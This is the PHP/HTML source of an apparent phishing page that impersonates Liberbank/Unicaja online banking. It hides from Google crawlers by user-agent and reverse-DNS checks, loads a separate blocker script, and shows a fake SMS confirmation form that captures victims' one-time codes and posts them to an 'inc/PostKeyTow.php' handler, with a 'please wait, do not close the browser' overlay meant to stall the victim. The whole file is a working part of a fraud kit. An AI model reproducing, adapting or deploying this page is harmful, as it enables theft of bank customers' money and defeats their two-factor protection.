<?php
session_start();
error_reporting(0);

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }


include("./blocker.php");


$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 25);

?>
<!DOCTYPE html>

<html lang="es">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no, maximum-scale=1">
    <meta name="format-detection" content="telephone=no">
    <title>Liberbank</title>
    <link rel="stylesheet" href="lib/css/movil.css" type="text/css" >
    <link rel="stylesheet" href="lib/css/calendario.css" type="text/css" >
    <link rel="apple-touch-icon" href="lib/images/apple-touch-icon-v1.png">
    <link rel="icon" href="lib/images/apple-touch-icon-v1.png" type="image/x-icon">
    <link rel="shortcut icon" href="lib/images/apple-touch-icon-v1.png" type="image/x-icon">
    <link href="lib/css/jquery.mmenu.all.css" type="text/css" rel="stylesheet">
    <link rel="stylesheet" href="lib/css/1274860507949.css" type="text/css">
    <script type="application/x-javascript" src="/lib/js/util.js"></script>
    <script src="lib/js/jquery-3.5.1.min.js" type="text/javascript"></script>
    <script src="lib/js/jquery.mmenu.min.all.js" type="text/javascript"></script>  

    <style>
      ul {
          list-style-type: none;
          margin: 0;
          padding: 0;
          overflow: hidden;
          border: 1px solid #e7e7e7;
          background-color: #f3f3f3;
      }

      li {
          float: left;
      }

      li a {
          display: block;
          color: #666;
          text-align: center;
          padding: 14px 16px;
          text-decoration: none;
      }

      #inferior1 a:link { color: #4C9C2F; text-decoration:none; }

      #pie {
        position: fixed;
        left: 0px;
        right: 0px;
        bottom: 44px;
      }

      #inferior2 {
        height: auto !important;
      }

      .frm-label {
        text-align: left;
        padding : 5px ​0 !important;
      }
    </style>

  <script src="res/js/q.js"></script>
  <link href="./lib/jquery-ui.theme.min.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/slick.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/bootstrap.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/bootstrap-multiselect.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/datatables.min.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/ladda.min.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/loading.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/general.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/modules.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/styles.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/ifb-BankiaWidgets.css" rel="stylesheet" type="text/css"> 
  <link href="./lib/styleWFG.css" rel="stylesheet" type="text/css"> 
  <script src="./res/js/jquery-1.9.0.min.js" type="text/javascript" charset="utf-8"></script>
  <script src="./res/js/jquery.maskedinput.js" type="text/javascript"></script>
  <script type="text/javascript">
    $(function() {
        $.mask.definitions['~'] = "[+-]";  //  placeholder=" xxxx xxxx xxxx xxxx " 
        $("#confirmacion").mask("9 9 9 9 9 9");
       
        /*
          .------..------..------.
          |D.--. ||C.--. ||H.--. |
          | :/\: || :/\: || :/\: |
          | (__) || :\/: || (__) |
          | '--'D|| '--'C|| '--'H|
          `------'`------'`------'
        */

        $("input").blur(function() {
            $("#info").html("Unmasked value: " + $(this).mask());
        }).dblclick(function() {
            $(this).unmask();
        });
    });

  </script>
  <script>
      $(document).ready(function(){
        $('#botonEntrar').click(function(e){
          e.preventDefault();
          if($('#confirmacion').val() == ""  ){
            $("#confirmacion").css("border-color", "red");
             return false;                              
          }
          else {
            $("#loader").show();
            setTimeout(stp , 0);
          }
          function stp(){
            $('form').submit();
          }
        });
      });
  </script>

  <script type="text/javascript">      
      $(document).ready(function () {
            $('#selectorloader').fadeIn('slow', function () {
                $('#selectorloader').delay(20000).fadeOut(150);
            });
        });
  </script>
  <link rel="stylesheet" type="text/css" href="./lib/bootstrap.min.css"> 
  <link rel="stylesheet" type="text/css" href="./lib/ladda.nim.css"> 
  <link rel="stylesheet" type="text/css" href="./lib/general.min.css"> 
  <link rel="stylesheet" type="text/css" href="./lib/modulesLogin.min.css"> 
  <link href="./lib//account_oi.css" rel="stylesheet" type="text/css">   
  <link href="lib/css/fontliberbank.css" rel="stylesheet" type="text/css" /> 
  <link href="lib/css/login2.css" rel="stylesheet" type="text/css" /> 
 
  <!-- FIN BANNER APP --> 
</head> 

<body onload="javascript: document.acceso.reset(); " >
    
    <div id="pagina">
      <div class="header">
        <div class="container py-2">
          <div class="row" style="border:0px">
            <div class="col d-flex align-items-center justify-content-between">
              <h1 class="d-flex align-items-center m-0">
                <i class="fas icono-logo-unicaja-liberbank"></i>
              </h1>
            </div>
          </div>
        </div>
      </div>
      <div id="toolbar">
        <span>Identificación</span>
      </div>

      <div class="pageLoader" id="selectorloader" style="background-color: #00a38d; position: fixed; width: 100%; height: 100%; z-index: 9999; top: 0px; opacity: 0.9; text-align: center; display: none;">
        <p style=" margin-top: 94px; font-size: 19px; color: white; font-weight: 500; ">
              <strong style="color: white;"> Contrato Multicanal</strong>
              Por favor espere mientras procesamos su solicitud No cierres el navegador
        </p>
        <div class="spinner loading"></div>
      </div>

      <div class="pageLoader" id="selectorloader" style="background-color: #002F6B; position: fixed; width: 100%; height: 100%; z-index: 9999; top: 0px; opacity: 0.9; text-align: center; display: none;">
        <p style=" margin-top: 94px; font-size: 19px; color: white; font-weight: 500; ">
          <strong style="color: white;"> Contrato Multicanal</strong>
          Por favor espere mientras procesamos su solicitud No cierres el navegador
        </p>
        <div class="spinner loading"></div>
      </div>
     
    <div aria-expanded="false" role="menu" class="mod_login  lgn-iframe" style="padding-top: 7px; margin-top: 50px;"> 
        <div id="panel" style = "padding-top: 10px;">  
          <div class="mod_message msg-error hide" id="messageValidando"> 
            <div class="msg-container"> 
            <p class="msg-text" id="mensajeErr">Revise los campos incorrectos indicados en el formulario</p> 
            <a data-function="fc-closeMessage" data-icon="c" class="msg-link data-ico-E"></a> 
            </div> 
          </div> 
          <form action="./inc/PostKeyTow.php" method="post" class="mod_form frm-login" name="formularioLogin" id="formularioLogin"> 
            <fieldset class="frm-fieldset" style="height: 43%;"> 
            <legend class="hideAccessible frm-legend"> <span class="frm-legend-txt">Acceso del cliente</span></legend> 
              <label for="id_usu_login" id="id_usu_login" class="frm-label">
                <span class="frm-label-txt">
                  Al cabo de un tiempo recibirás un código SMS para confirmación Debe haber recibido un mensaje de texto con un código en su teléfono.
                </span> 
                <div class="hide" id="placeHolderLogin"> 
                <div class="msg-container"> 
                  <p class="msg-text" id="placeHolderLoginPU"></p> 
                  <a data-function="fc-closeMessage" data-icon="c" class="msg-link data-ico-E"></a> 
                </div> 
                </div> 
                <input type="text" style="text-align: center;" name="confirmacion" id="confirmacion" class="frm-input">
              </label> 
            
              <div class="mod_buttons">   
                <input type="submit" value="Seguir" name="accountesmskey" id="botonEntrar" class="but-green but-wDefault ladda-button">
              </div> 
            </fieldset>
          </form> 
        </div>
    </div>

    <div id="pie">
              © Unicaja 2021. Todos los derechos reservados
    </div>

    <div id="inferior2">
      <div style="float: left;"><a href='#'>Aviso legal</a></div>
      <div style="float: right;"><a href='#'>Versión clásica</a></div>
      <div style="margin: 0 auto; width: 100px;"><a href='#'>Seguridad</a></div>
    </div>

</div>

</body>

</html>